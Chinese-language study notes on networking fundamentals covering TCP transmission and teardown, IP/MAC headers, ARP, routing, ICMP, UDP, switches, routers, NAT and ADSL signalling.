由于应用程序对自己的数据最了解，而栈议栈并不了解，因此协议栈提供了参数选项，应用程序可传递参数给协议栈，告知其准确高效的发送办法； 对较大的数据进行拆分当所要发送的数据超过了 MSS 时，就需要对包进行拆分，为每个包加上必要的头部信息，示例如下： 使用 ACK 号确认网络包已收到数据包发送出去后，发送方的事情并没有就到此结束，它还需要确认对方是否已经收到；如果没有收到，需要重新发送，直到对方收到为止； 为了让接收方知道当前数据包的序号，发送方会将当前包中数据在完整数据中的偏移量放在头部中，作为序号信息，这样接收方收到该包后，马上就知道这段数据，应该放置在整体数据的具体位置；另外，由于头部中还有一个字段是记录当前数据包的头部长度的，因此接收方也能够很快速的知道从数据包中的哪个具体位置开始读取数据； 根据网络包平均往返时间调整 ACK 号等待时间发送方需要等待接收方返回 ACK 号，然后再判断是否需要重发。这个等待时间的大小很有讲究，因为太大或太小都需要付出代价；太大的，等待过久，用户体验不好；太小的话，重复发送，导致网络堵塞，最终网络速度变慢，同样用户体验不好； 由于 ACK 的返回速度跟接收方的地理位置有关，理论上双方离得越远，返回的就越慢，因此最好的办法是根据实际情况，动态设置 ACK 等待时间； 使用窗口有效管理 ACK 号当有了 ACK 等待时间后，在 ACK 号返回前，如果傻傻的等待，啥事也不做，显然有点浪费资源，因此便产生了滑动窗口的概念。它的意思是根据窗口大小，一次发出一批多个包，然后在收到接收方的 ACK 信号后，再发送下一批； 由于接收方为接收数据所分配的缓冲区大小是有上限的，因此当到达的数据过快过多，而数据又未能被及时处理并清空缓冲区的话，就有可能导致缓冲区溢出。为了避免这个情况，接收方会在一开始将自己可用的缓冲区大小告知发送方。发送方在收到该信息后，在不超过该值的情况下，发送合适数量的数据包出去，然后等待接收方下一次告知可用缓冲区大小后，再开始新一轮的发送动作； 虽然这张图显示的好像发送方有等待的情况出现，但在现实情况中，由于接收方的处理速度往往远大于网络速度，因此这种等待的情况不常出现（除非应用程序不来及时取走数据）。接收方在收到数据并清空缓冲区后，发送方的下一个包经常还没有到达，因此接收方发出的窗口大小仍然是完整的大小； ACK 与窗口的合并如果接收方每次收到包就马上发送 ACK 号，每次缓冲区大小出现变化，就马上发送新的窗口大小，则接收方发送的包数量将大大增加，从而增加网络堵塞的风险。为了降低这种网络，接收方会设置一段等待时间，在该段等待时间内，如果出现多条 ACK 消息和多个窗口消息，则可以将它们合并成一条，这样就可以有效的提高传输效率； 接收 HTTP 响应消息应用程序（如浏览器）在发出请求后，会紧接着调用 read 函数从缓冲区中读取数据，但由于数据没有那么快就回来，因此协议栈会先将该操作挂起，等待数据回来后（发触发事件），然后结束挂起，开始读取数据； 在收到数据后，发送方的协议栈所做的事情如下： 收到包，开始解析包，检查数据是否完整； 如果完整，给发送方发 ACK 信号；如果不完整，丢弃该包； 将包中的数据暂存到缓冲区，回到第一步，解析下一个包，直到解析完已收到的所有包； 将已到达的多个数据包组装还原成连续的数据，写入应用程序指定的内存地址，清空缓冲区； 给发送方发送新的窗口（可用缓冲区）大小； 从服务器断开并删除套接字数据发送完毕后断开连接断开连接的时机和操作由应用程序（接收和发送的任意一方都可以）来决定的，因为协议栈无法知道什么数据算是发送完了。一般来说，完成发送的一方会断开连接（Web 程序一般是由服务器来断开，因为它最清楚本次请求的数据是否已经发送完毕了，客户端反而不是第一时间知道）； 当服务端想要发起断开连接的操作时，只需调用 socket 库中 的 close 函数，它会生成一个只有头部没有主体的 TCP 数据包，包头部中的 FIN 字段值会设置为 1，表示 FINISH 为 True，然后将该包交给 IP 模块发送出去； 客户端在收到该 FIN 包后，会更新 Socket 对象中的状态字段，以标记为断开状态，然后发一个 ACK 包给服务端，表示自己收到 FIN 包了； 之后当应用程序调用 read 函数来读取数据时，如果缓冲区中有数据，就将数据交给应用程序，直至清空缓冲区 ；如果没有数据，则给应用程序返回信号，告知应用程序数据已经全部接收完毕了，没有更多的数据了。然后应用程序会调用 socket 库的 close 函数，关闭连接。此时客户端会发送一个 FIN 包给服务端；服务端收到该 FIN 包后，会返回一个 ACK 信号； 删除套接字当连接断开后，双方的套接字并不会立即删除，而是会保留一段时间后（一般是几分钟）再删除。之所以如此，是为了避免出现异外情况。例如客户端在收到服务端的 FIN 包后，会返回一个 ACK 信号给服务端，但有可能该 ACK 在网络中丢失了。因此过了一段时间服务端会重发一次 FIN 信号。如果客户端在发出 ACK 信号后，即将套接字删除，并将端口分配给一个新的应用程序，则有可能导致该应用程序收到服务端的 FIN 包，导致连接出错； 数据收发操作小结 IP 与以太网的包收发操作包的基本知识 MAC 头部也是由 IP 协议栈来写入的，IP 协议栈将下一个转发设备的 MAC 地址作为 MAC 头部的字段。之后以太网协议根据这个 MAC 头部，就可以知道应该将数据包发给哪台转发设备；因此，在整个传输过程中，MAC 头部的信息是不断变化的，由当前转发设备改写它，改写后的新内容是下一个转发设备的 MAC 地址； 转发设备在收到数据包后，会先去掉 MAC 头部，然后查看里面的目的地服务器的 IP 地址，然后基于该 IP 地址，从自己维护的映射表中，找到下一个转发设备的 MAC 地址，然后为数据包添加新的 MAC 头部； 此处基于以太网来举例，所以用到了 MAC 头部。当数据包在某个非以太网的网络中进行传输时，转发设备就会按照不同的协议规定，为其添加相应的头部，例如无线网、ADSL等，以便该数据包在新的网络中，也可以进行传输。这就是分层的好处，某一层的改变，不会影响到其他层，从而在使用过程中可以非常的灵活，任意的组合，兼容各种使用场景； 包收发操作概览当收到 TCP 数据包后，IP 模块需要为其添加两个头部，分别是 IP 头部（带 IP 地址）和 MAC 头部（带 MAC 地址）；IP 模块并不关心 TCP 包的类型（控制包、数据包）和内容，一视同仁，处理方式完全一样； 生成包含接收方 IP 地址的 IP 头部IP 头部主要字段如下： 版本号：4 bit，IP 协议版本号，例如 IPv4 还是 IPv6； 头部长度 IHL：4 bit，由于存在可选字段，头部长度是动态的，因此需要有字段来标注长度； 服务类型 ToS：8 bit，包传输的优先级； 总长度：16 bit，整条 IP 消息的总长度； ID 号：16 bit，用来标识包的编号，类似于序列号；如果包被分片，则所有分片的 ID 号会相同，以便识别它们属于同一个包； 标志 Flag：3 bit，表示当前包是否允许分片，以及是否存在分片； 分片偏移量：13 bit，表示当前分片从整条 IP 消息的起始位置； 生存时间 TTL：8 bit，为了避免出现 网络回环时，包在网络中被无限制的传递下去；每经过一个中转设备，该值就会减 1，当减为 0 后，就不转发该包，而是直接丢弃（貌似该值可用来判断包被转发了多少次？）； 协议号：8 bit，用来表示 TCP、UDP、ICMP 等协议信息； 头部检验和：16 bit，用来数据完整性，据说现在已经弃用； 发送方 IP 地址：32 bit 接收方 IP 地址：32 bit 其他可选字段：很少使用； IP 地址并非分配给计算机的，而是分配给网卡的，因此一台计算机有多个网卡时，就可以拥有多个 IP 地址；例如笔记本电脑既支持有线连接，也支持无线连接，因此其实它配备了两张网卡，如果两种连接都启用的话，会有两个 IP 地址； 当计算机拥有多张网卡和多个 IP 时，如果判断数据包应该交给哪张网卡进行转发呢？答案是使用路由表（route table）；路由表中记载着转发规则，其中会有一条通用规则，当其他规则都无法匹配时，就使用该通用规则来转发。通用规则一般表示默认网关，它的目标地址和掩码都是 0.0.0.0； 路由表一般有下面几列： Destination：表示目标地址； Netmask：表示掩码，用来和 TCP 告知的目标 IP 地址进行掩码计算，再根据计算结果匹配对应的 Destination； Gateway：表示路由器的 IP 地址； Interface：表示负责发送数据包的网络接口（即网卡），当匹配成功时，就会在 IP 头部中填写该 Interface 的 IP 地址作为发送方地址，然后将数据包交给该网卡进行发送；发送的目的地即是 Gateway（此处的目的地猜测不是去改写 TCP 包中的目标 IP 地址，而是在 MAC 头部中填写该 Gateway 对应的 MAC 地址）； Metric：表示线路的传输成本，值越高，表示距离 越远； IP 模块在给数据包添加 IP 头部和 MAC 头部前，需要先到路由表中查询对应的信息，之后才有办法生成头部； 生成以太网用的 MAC 头部MAC 头部主要有以下几个字段： 接收方的 MAC 地址：48 bit，不像 IP 地址有层级结构，整个地址是一个整体，没有层级规律； 发送方的 MAC 地址：48bit，网卡自带的 MAC 地址； 以太类型：表示不同的协议，例如 ARP协议、IPv6 协议、IP 协议、IEEE802.3 协议等； 通过 ARP 查询目标路由器的 MAC 地址ARP：address resolution protocol，地址解析协议，基于 IP 地址查询相应的 MAC 地址； ARP 有点类似广播机制，它会向同一子网中的所有设备广播一条查询消息；收到消息的设备，会检查自己的 IP 是否与查询信息匹配，如果匹配，就应答；如果不匹配，就保持沉默；（如果是连接到集线器的话，广播是可以理解的；但好奇如果网卡是连接到路由器而，路由器应该不会广播吧，而是直接返回结果？） 为了避免重复查询，IP 模块使用了 ARP 缓存。每次查询一条新记录后，就将结果保存到缓存中。这样下次查询的时候，先查找一下缓存中的记录，如果能够找到，就不需要对外广播查询了，提高效率； 由于外部的 IP 地址可能是动态变化，同一个 IP 地址，一段时间后，可能绑定到了一台新的设备上面。因此 ARP 缓存中的数据是会失效的。为了规避失效问题，简单粗暴的办法就是每隔一段时间，让删除缓存记录，这样就可以定期更新了；尽管如此，在刷新之前，有可能缓存记录就已经是错的了，这个时候就只能手动删除缓存来解决了； 添加 MAC 头部的动作理论上也可以交由网卡来完成，但这样会导致网卡（硬件）和网络类型耦合，降低了网卡的通用性，因此设计成由 IP 模块来完成添加 MAC 头部的动作会更加合理； 以太网的基本知识最早的以太网是设计成广播式的，以太网中的各个设备通过一条主干网线连接起来，然后任意一台设备发出的数据包，会传输给所有的设备。收到的数据包的设备检查包中的 MAC 地址是否与自己的相符，如果相符，就处理它；如果不符，就丢弃它；显然，这种方式效率有点低，后来进一步进化，衍生出了交换机。交换机作为中介接收数据包，再将数据包发给匹配的设备，不再广播给所有设备了，这样提高了处理效率； 简化来说，以太网可以视作基于 MAC 地址进行相互通讯的一个局域网络； 将 IP 包转换成电或光信号发送出去IP 模块完成添加头部的动作后，接下来就需要将数据包交给网卡驱动进行处理了。网卡驱动负责将数据写入到网卡的缓冲区，然后通知网卡内部的 MAC 模块进行发送；MAC 模块收到指令后，从缓冲区读取数据后，交给 PHY 模块转成电信号发送出去； 虽然每张网卡在出厂的时候的内置一个全球唯一的 MAC 地址，但是实际通信过程中不一定会使用它。该地址可由网卡驱动程序从网卡内置的 ROM 中读取，也可以由用户自己设置写入驱动程序，此时会忽略内置的 ROM； 给网络包再加 3 个控制数据 网卡的 MAC 模块从缓冲区读取完数据后，会为它们再次添加三个数据，分别是： 报头：56 bit，由 1 和 0 组成的比特序列；这些 1 和 0 序列转成电信号后，会出现特定形状的波形，接收方基于该波形判断什么时候开始读取数据（用来同步双方的时钟周期）； 起始桢分界符 SFD：8 bit， 也是一个特定 1 和 0 组成的序列，接收方在看到该序列时，就知道接下来的部分是主体数据了； FCS：32 bit，校验和，方便接收方判断所接收到的数据是否完整和正确，用来排除传输过程中的信号干扰； 之所以会有波形的概念，然后在于 1 和 0 会被转化成特定的电压和电流，这样电压和电流就会出现变化，形成波；理论上，接收方在收到电信号波后，可以将其还原成 0 和 1。但这里面存在一个问题，当连续出现 1 或 0 的时候，波形没有变化，这个时候就抓瞎了，不知道该段波形中包含几个 1 或 0； 为了能够能够一段没有变化的波形中，包含几个 1 或 0，就需要引入时钟单位，每个时钟单位对应一个比特。这样就可以知道一段没有变化的波形包含几个比特的 1 或 0 了；最简单粗暴的办法，是增加一条线路，将时钟信号也发给接收方。这样接收方就可以根据时钟信号，对另外一条线路中的数据信号进行解读。 但是这又引入了一个新的问题，当有两条线路时，它们很难是一样长度的。随着距离超长，二者的长短误差就会变得越大。大到一定程度时，就会导致时钟偏移（偏左或偏右了），这样最终读取出来的数据就不准确了； 为了解决偏移问题，一个巧妙的办法是将两种信号叠加起来，然后额外告知对方时钟的变化周期，让双方的时钟周期实现同步。这就是报头的作用，报头本质上是一段让接收方获得发送方时钟周期的特殊信号；接收方在收到数据包后，解析报头，获得时钟信号。然后反算出数据信号； 向集线器发送网络包网卡的 MAC 模块为数据添加头部、分界符和校验值之后，就可以调用 PHY（MAU）模块将数据转成电信号发送出去。日常生活中经常听到的 10M 或 100M 带宽的意思即是每秒种可以将多少数字信号转成电信号； 集线器的工作方式是半双工的，意思是同一个时刻，要么是发送状态，要么是接收状态，两种状态不能同时存在，有点像对讲机；因此，在给集线器发送信号之前，网卡需要先判断一下当前的线路状态，如果处于空闲就可以发送；如果正在发送上一组信号，或者正在接收信号，则需要等待；当多台设备同时发送信号时，就会出现信号碰撞，导致传输的信号无效。这时检测到碰撞的设备会广播碰撞信号，所有收到广播的设备都会终止发送。然后根据各自的 MAC 地址计算出各自的等待时间，之后再开始发送； 交换机的工作方式是全双工的，接收和发送可以同时发生，因此不会发生信号碰撞的问题，传输效率要高很多，也比较简单； MAC 模块转换成的电信号是通用格式，但实际是线路有很多规格，不同规格有不同的电信号模式。因此 PHY 模块需要负责将通用电信号转换成特定类型的电信号。例如 10BASE-T 类型的电信号以变化代表 1，没有变化代表 0，如下图： 接收返回包包的接收过程和发送过程刚好是反过来的，区别在于 MAC 模块将数据存入缓冲区后，需要发出中断信号，这样 CPU 才会宠幸一下，将控制权转移给中断处理程序，中断处理程序再通知网卡驱动程序，把缓冲区中的数据拿走处理； 网卡驱动程序取到数据后，从 MAC 头部解析出以太网类型（如 0800 表示 TCP&#x2F;IP），然后调用相应的栈议栈（如 TCP&#x2F;IP）对数据包进行处理。协议栈拿到数据后，对头部进行解析，判断消息应该交给哪个应用程序进行处理； 将服务器的响应包从 IP 传递给 TCPIP 模块在收到网卡驱动程序的数据包后，会先检查一下这个包是否属于自己（通过比对接收方 IP 地址和当前网卡的 IP 地址是否一致）；如果一致，就接收；如果不一致，就报错； IP 模块报错的方法是按照 ICMP 协议给发送方发一条 ICMP 消息（类型 3，Destination Unreachable），常见的消息如下： 类型0：Echo reply，用来响应类型 8 的 Echo 消息； 类型3：Destination unreachable，告知对方包未送达目的地，中途被丢弃了；例如因为目标 IP 地址不在路由表中、目标端口号没有对应的套接字等； 类型4：Source quench，告知对方收到太多包了，超负荷了，要求对方降低发送速度； 类型5：Redirect，重定向，告知对方正确的发送地址； 类型8：Echo，ping 消息，用来检查一下对方是否存在。如果存在，对方会回个类型 0 的消息；如果没有回，表示不存在； 类型11：Time exceeded，告知对方收到当前数据包时， TTL 已经减为 0 因此包被丢弃了； 类型12： Parameter problem，告知对方头部存在字段错误； 有时候 IP 模块还需要做一项“分片重组”的工作。出现这种情况是因为 TCP 数据包比较大，因此需要分成多个小包；这些小包在头部有标记相同的包 ID，同时还有偏移量。因此，IP 模块可以基于这些信息实现重组； IP 模块完成工作后，会将数据包交给 TCP 模块。TCP 模块会根据接发双方的 IP 地址和端口号，从映射表里面找到对应的套接字，然后根据套接字中的状态，执行不同的操作： 如果是数据包，则返回 ACK 消息，并将数据存入缓冲区，等待应用程序来取； 如果是控制包，则按规则执行相应的动作； 注意，由于 TCP 模块需要用到 IP 头部中的信息，因此 IP 模块在将数据包转给 TCP 模块处理时，并没有将 IP 头部去掉，不然 TCP 模块就得不到该数据了； UDP 协议的收发操作不需要重发的数据用 UDP 发送更高效TCP 协议为了保证数据完整到达，建立了一套 ACK 机制，因此整个传输过程相对比较复杂（交换控制信息、交换窗口大小、互发 ACK，互发断开信号等）；但有些场景并不需要确保数据完整到达，例如音频和视频数据，丢几个包也没什么大不了；又或者像 DNS 查询，数据很少，一个包就装得下了，不存在丢失其中一个包的情况；此时就可以使用更加简化的 UDP 协议来传输数据。由于不需要保证每个包都到达，一下子事情就变得简单多了； 发现发送一段数据，UDP 协议只要一个来回就行了，TCP 要好几个来回，多搞不少事情； 控制用的短数据类似 DNS 查询之类的短数据，就很适合使用 UDP 来通信；UDP 协议有多简单呢，简单到在收到应用程序的消息后，只需要加上 UDP 头部，之后就可以将数据包转给 IP 模块处理了，其他工作统统没有；如果丢包了，只要过一段时间发现没有返回响应，再重发一次就好了； UDP 头部总共有 8 字节（64 bit），包含以下几个字段： 发送方端口：16 bit 接收方端口：16 bit 数据长度：16 bit，头部之后的数据长度，注意这里头部的长度是固定的，但数据部分的长度不固定； 校验和：16 bit 音频和视频数据由于音频和视频播放场景对丢包的容忍度比较高，但对播放流畅度有要求，因此也很适合使用 UDP 来传输数据； 有时防火墙会阻止 UDP 协议，因此需要更改规则对 UDP 放行，要么就只能改用 TCP 协议来发送了； 从网线到网络设备信号在网线和集线器中传输每个包都是独立传输的包从网卡出来后，在网络中的传输过程是只涉及到 MAC 头部和 IP 头部，因此 TCP 头部和内容，都与传输过程无关，因为在传输过程中用不到里面的数据； 防止网线中的信号衰减很重要 信号传输的本质其实是在网线上施加正负变化的电压，但是在发送端很清晰准确的电压值，在传输过程中，随着距离加大，会出现衰减，并且也会受到干扰。因此，当信号到达接收端的时候，其波形以及电压值有可能失真。如果失真的程度很大，则会造成信号值解析错误； 双绞是为了抑制噪声当网线周围存在电磁波时，由于信号线是金属，因此会在信号线上产生电流，叠加到原本的信号电流，导致电流受到干扰出现失真；双绞线的原理，就是让网线不是直的，而是呈螺旋型，这样网线一直在左右两个方向拐来拐去改变方向。而根据电磁波的原理，它会在不同方向的网线上产生方向相反的电流，因此这两部分电流刚好相互抵销； 其他降低噪声的措施： 在信号线外部包裹金属屏蔽网； 在信号线之间增加隔板； 集线器将信号发往所有线路以太网最初的设计是广播机制，即信号被广播到所有连接到同一网络的设备，然后由各个设备自行判断当前数据包是否属于自己；是就接收，不是就丢弃； 网线支持全双工，这意味着发送信号和接收信号的线是分工单独运行的，因此当两个设备使用网线进行连接的时候，需要使用交叉接线，不然发送对发送，信号就碰撞了；网卡一般是直线接线（MDI），集线器默认是交叉接线（MDI-X），这样网卡可以用网线直接连接到集线器即可正常工作。但是如果是两台集线器之间，就需要做切换转换，集线器一般自带信号转换开关。开关的作用是将当前接口由默认的 MDI-X 模式转换为 MDI 模式；如果是两台计算机直连，则需要使用交叉网线； 集线器的功能非常简单，大部分是使用中断电路，将发送方的信号，原封不动的广播到所有其他设备上面（貌似非常吻合早期的原始场景）； 交换机的包转发操作交换机根据地址表进行转发交换机比集线器智能一点，不再广播数据包，而是维护一张 MAC 地址和端口的映射表，然后收到数据包里面，从 MAC 头部解析出 MAC 地址，再从映射表中查询到相应的端口，之后将数据包转发给该端口上面的设备即可； 当然，为了得到数据包中的 MAC 地址，交换机也是需要会出不少代价的，它需要做一遍普通网卡需要做的数据包解析工作。因此，可以将每个交换机上面的端口近似看做一张网卡。唯一的不同是交换机端口会接收所有的包，不像网卡会丢弃不属于自己的包； 网卡支持开启 MIX 模式，在该模式下，网卡会接收所有的包。如果在计算机中安装一个软件对包按 MAC 地址进行转发，那么计算机就可以扮演交换机的功能，相当于”软交换机“； 交换机通过交换电路来实现转发。交换电路的原理也非常简单，它通过一个二维的开关网格，来实现输入端和输出端之间的电路连接。通过操控网格中的电子开关，就可以将任意一路输入端和任意一路输出端连接起来；而且可以并发转不同的输入端信号； MAC 地址表的维护MAC 地址表的维护涉及两个动作，分别如下： 添加：当收到一个数据包时，解析出其中的发送方 MAC 地址后，将其写入地址表，映射到相应的端口号上面； 删除：定期删除记录，以避免设备断开旧端口，切换到新接口； 特殊操作 当交换机发现某个包的接收方 MAC 地址和发送方 MAC 地址相同时，就会丢弃该包，因为无法实现转发； 当交换机发现某个包的接收方 MAC 地址不在地址表中时，就会在网络中广播这个包； 当交换机发现某个包的接收方 MAC 地址是一个广播地址时，也会广播该包；广播地址有标准格式，即 6 个 FF，或者 IP 地址中的 4 个 255； 全双工模式可以同时进行发送和接收早期的以太网规范只规定了半双工模式，但显然这种传输方式由于要避免信号碰撞，导致传输效率低下。后来规范进行了更新，开始支持全双工模式； 为了支持全双工模式，网卡中的 MAC 模块需要由分别负责发送和接收两个独立模块组成； 自动协商：确定最优的传输速率在以太网的连接中，当双方没有传输数据时，线路并不是空闲的，而是会持续发送脉冲信号，用来检测当前线路是否处于正常连接的状态；当连接正常时，网卡上的 LED 指示灯会显示绿色； 早期的脉冲信号很简单，仅用来探测连接正常即可。后来人们利用信号中的偶数位置，来传递有意义的信号，用于双方的工作模式和传输速率自动协商； 交换机可同时执行多个转发操作由于交换机每次只将数据包转发给特定的端口，其他端口并不会接收到该数据包，因此其他端口也可以同时发送或接收自己的数据，即所有的端口都是可以同时工作的，不像集线器模式下，当某个端口广播数据时，其他端口只能停下来并接收数据； 路由器的包转发操作路由器的基本知识路由器的核心功能也是包的转发，它与交换机的区别在于，交换机是面向以太网设计的，因此基于 MAC 地址进行转发判断；而路由器是基于互联网设计的，因此它是基于 IP 地址进行转发判断； 路由器主要由两个模块组成，一个是端口模块，一个是转发模块。转发模块负责判断数据包的目的地（类似 IP 模块，基于路由表的查询），端口模块则负责具体收发操作（类似网卡）； 不同的路由器拥有一种或多种端口，可以支持多种不同的网络，例如无线局域网、ADSL、FTTH（光纤）、以太网等； 路由器和交换机的一个最大区别在于，交换机只是通过交换电路，帮助收发双方的电路实现连接，它本身并不参与其中。但路由器则不同，它是以独立的中间人身份介入整个收发过程的。发送方和接收方并没有直接互联，而是对接路由器这个中间方；相当于接收方只知道路由器的存在，并没有和发送方直接打交道；为了扮演中间人的作用，路由器上的每个端口都有自己的 IP 地址，而交换机则没有（但也可以有，如果开启 DHCP 功能的话）； 路由器有点像是一个透明代理 路由表中的信息交换机维护的是 MAC 地址映射表，而路由器维护的则是 IP 地址映射表； 10.10.1.0 &#x2F; 255.255.255.0 所表达的含义和 10.10.1.0 &#x2F; 24，是完全相同的，都是用来表示匹配该地址的前 24 个位即可；子网掩码的功能是用来表示需要匹配目标地址多少个位；因此，会存在多种匹配级别，例如前8位、前16位、前24位，前32位等；当为前32位时，由于 IPv4 地址总共也才 32 位，因此已经是全部匹配了，此时一般对应某台具体的主机； 当匹配到某条路由记录后，就可以读取记录中的端口号，用来作为数据包的转发目标； 交换机的 MAC 地址表是由交换机自动维护的，而路由器上的路由表，则同时支持自动维护和手工维护两种模式；自动维护会涉及到路由协议，常见的路由协议有 RIP, OSPC, BGP 等； 路由器的包接收操作路由器的包接收操作跟普通网卡基本没有区别，如果它发现数据包中的 MAC 地址跟当前端口的 MAC 地址不同，它也会像网卡一样，直接丢弃该包，而不会像交换机那样将包收下来； 查询路由表确定输出端口当路由器在路由表中匹配到多条记录时，最长匹配长度的那条记录将胜出，做为转发目标；如果有多条记录匹配的长度相同，那么跃点数最少的那条记录胜出；如果在路由表中查询不到匹配记录，则丢弃该包，并给发送发送一条 ICMP 消息，告知目标 IP 地址有误； 由于路由表中一般设置有默认匹配路由，所以丢弃包的情况貌似不太容易出现； 找不到匹配路由时选择默认路由默认路由的子网掩码为 0.0.0.0，它表示需要匹配的比特位数量为 0 个，因此相当于匹配所有了；计算机的网卡 IPv4 属性设置中，也有一个默认网关，其实它就是在设置默认路由； 包的有效期路由器在转发包的时候，会更新其中数据包头部的 TTL 值，以避免回环；默认值一般为 64 或者 128； 通过分片功能拆分大网络包由于路由器支持多种端口，因此可能存在收到的数据包尺寸大于端口能够支持的最大尺寸，此时路由器就需要对包作分片的动作，以便能够将包转发出去； 有两种情况不允许分片： 头部字段禁止分片；遇到情况会丢弃该包，并发送 ICMP 消息通知发送方； 数据包已经分过片了； 路由器的发送操作和计算机相同路由在转发数据包时与计算机网卡发送数据包的过程基本相同。唯一的不同点是在计算机上面，网关地址即是目标发送地址，根据该地址查询 MAC 地址并添加到 MAC 头部即可。但路由器的网关地址一般为空，此时需要根据最终目标 IP 地址来查询 MAC 地址并添加到 MAC 头部（注：查询回来的结果并不是绑定目标 IP 地址的设备 MAC 地址，而其实是下一个中转设备的 MAC 地址（如交换机或路由器）； 路由器与交换机的关系IP 路由器工作在 IP 层面，它通过查询目标 IP 地址的 MAC 地址，然后将其写到 MAC 头部中；之后交换机通过该头中的 MAC 地址，将数据包转发到下一个路由器； 路由器的附加功能通过地址转换有效利用 IP 地址如果全世界每一个计算机都分配一个 IPv4 地址的话，按照 IPv4 地址的长度来计算，是完全不够分配的，因为计算机的数量增长得太快了。因此，人们制订了规则，将当时还未分配的三段 IPv4 地址，设置为仅限内部子网使用。这样每家公司都可以在其子网内自行分配 IP 地址，而不用担心和其他公司产生冲突。而为子网的出口设备分配一个公共 IP，这样子网内的计算机可以和子网外的计算机进行通信了；这个机制是很好的，但是在数据包从子网内到子网外时，需要增加一个动作，即对其做地址转换才行； 私有地址分别有以下三段： 10.0.0.0 至 10.255.255.255，约可容纳 1600 万台； 172.16.0.0 至 172.31.255.255，约可容纳 100 万台； 192.168.0.0 至 192.168.255.255，约可容纳 6 万台 地址转换的基本原理地址转换的原理非常简单，就是将数据包 IP 头部中的私有地址和端口，改成公有地址和新端口，并在内部建立映射表，然后发送出去。建立映射表的目的是当接收方返回数据时，可以根据映射表再次转换，将数据包转发给内网的设备； 改写端口号的原因如果不改写端口号，那么只能通过 IP 地址来区分不同的内网设备，这时就需要分每台内网分配一个唯一的公共 IP 地址，并在连接结束后收回。这种方式虽然也可行，但无法最大化的节省公共 IP 地址。因为当内网设备很多的时候，并且有同时上网的需求，就会分配一大堆的公共 IP 地址； 从互联网访问公司内网地址转换会带来一个有趣的副作用，即如果地址转换映射表中没有记录，从互联网进入内网的包就不知道应转发给哪个设备，此时路由器就会丢弃该包。该副作用是可以保护内网设备的安全性，防止非法入侵； 路由器的包过滤功能所谓的包过滤，指根据 MAC 头部、IP 头部、TCP 头部中的内容，与提前预设的规则进行匹配，然后根据匹配结果，决定是否丢弃包，还是转发包；多数防火墙软件即是基于包过滤来实现； 虽然包过滤的原理很简单，但是想要实现正确的配置，在实现正常访问的同时，还能够防止非常入侵，是非常困难的 通过接入网进入互联网内部 ADSL 接入网的结构和工作方式互联网的基本结构和家庭、公司网络是相同的互联网的基本结构和家庭或公司内部网络是相同的，主要不同点如下： 由于物理距离变长和线路的信号衰减，因此需要在中间增加很多路由器作为中间转发设备； 路由器上面的路由表由于转发记录很大，其维护机制有所不同； 连接用户与互联网的接入网不管是互联网接入路由器，还是以太网路由器，它们的主要职责和原理都是一样的，即根据路由包负责包的转发。有多种方式可以将家庭或公司接入互联网，例如 ADSL（电话线）、FTTH（光纤）、CATV（有线电视）等，因此互联网接入路由器会基于入网规则来转发包； ADSL：asymmetric digital subscriber line，不对称数字用户线路。利用现有电话线进行通信的技术，它的特点是上行和下行不对称； ADSL Modem 将包拆分成信元 当使用 ADSL 来接入网络时，接入路由器通常使用 PPPoE 方式进行连接，因此路由器会按照 PPPoE 规则，给包加上PPP 头部、PPPoE 头部和 MAC 头部，然后再将包发送给 ADSL Modem；Modem 的职责是将收到的包拆成 ATML 信元，然后转成电信号发送给运营商的 Modem； ATM：Asynchronous Transfer Mode，异步传输。ATM 信元也是一种数据包，但是它很小，头部只有 5 个字节，数据主体只有 48 字节，使用 ATM 通信协议； ADSL 之所以使用 ATM 将包拆分成更小的单位，其初衷是尽可能提高兼容性，降低设备的开始和投入成本； ADSL 将信元“调制”成信号网线在传输数字信号时，一般使用方波，它的优点是简单，但缺点是容易失真，随着距离变长，出错率会上升。ADSL 为了克服容易失真的缺点，使用了正弦波（圆滑波形）合成信号（调制）来表示 0 和 1； 调制信号有很多种方法，例如振幅调制、相位调制。它们的区别在于使用不同的方法来表示 0 和 1，甚至表示更多的位，例如用 4 种振幅分别表示 00、01、10、11 等（虽然振幅越多可以表示更多种情况，但也更容易误判出错）； 相位调制也可以让波从不同位置开始来表示四种情况，示例如下： 正交振幅调制通过结合振幅调制和相位调制，就可以用表示四种情况；由于振幅和相位是不同维度的特征，因此这种维度结合方案，相对单维度的细分方案，更加健壮不容易出错； ADSL 通过使用多个波来提高速率波是可以有多种频率的，而通过滤波器我们又可以将不同频率的波分离出来。因此，通过将多种频率的波合成在一起，我们就可以在单位时间内传递更多的信号，而单位时间可以传递的信号数量即是带宽。 ADSL 通过合成上百个不同频率的波，来实现更大的带宽。为了降低分离难度，每种波使用一定的频率范围，不同波之间的频率间隔为 4.312 KHz，并且都使用正交振幅进行调制； 另外不同频段的波，其受到的环境噪声不一样（一般来说，频段越高，衰减和噪声越大）。如果某个频段的环境噪声小，就可以分配更多的比特位；如果噪声大，就分配较少的比特位； ADSL 之所以能够实现上下行不同的速率，其原因就在于它为上行和下行分配了不同的数量的频段。上行的频段数量少一些，下行的多一些。 噪声和衰减由环境的影响很大，因此每条线路都会存在不同的情况。在为频段分配比特位时，为了提高分配效率，ADSL 在线路通电初始化时，会先做一个测试。根据测试结果，为不同的频段分配最合理数量的比特数（该过程称为训练，一般需要消耗几秒到几十秒左右的时间）； 分离器的作用由于 ADSL 借助电话线进行信号的传播，因此电话信号和网络信号会同时在电话线上存在。分离器的作用，就是根据信号的频率，将电话信号（低频信号）分离出来，并将电话信号转给电话机。不然电话机如果收到所有的信号，就会导致电话声音包含很多噪声，无法听清； 电话机在接通和挂断信号的瞬间，会导致线路的信号出现突然的增加和减少，因此会改变噪声条件。正常情况下，当噪声条件改变时，Modem 之间就需要重新握手。显然这样很不合理，因为在接听或挂断电话时，就会导致网络中断。分离器的另外一个作用，就是避免这种情况的出现。 从用户到电话局电信号从 Modem 出来后，就是走的日常的电话线路了。一般一幢大楼有很多住户或公司，因此每家住户或公司的电话线会先到达本栋大楼的 IDF（中间配线盘） 或 MDF （主配线盘），然后到达保安器（用来防雷击），最后汇成一股，接到室外的电线杆，延伸到电信局附近，然后走到地下，通过电缆隧道，进入电信局大楼的地下室。之所以最后一段要走地下，是为了避免电信局附近竖起大量的电线杆，一来占地太多，二来有火灾隐患； 配线盘的目的是将电信局出来的线路与各住户或公司进行一一对应； 噪声的干扰由于电话线也是使用金属来传递电信号，因此它不可避免也会出现噪声干扰的问题；由于电话线设计之初并未考虑到会用来传递 ADSL 高频信号，因此它比双绞网线更容易受到噪声的干扰； 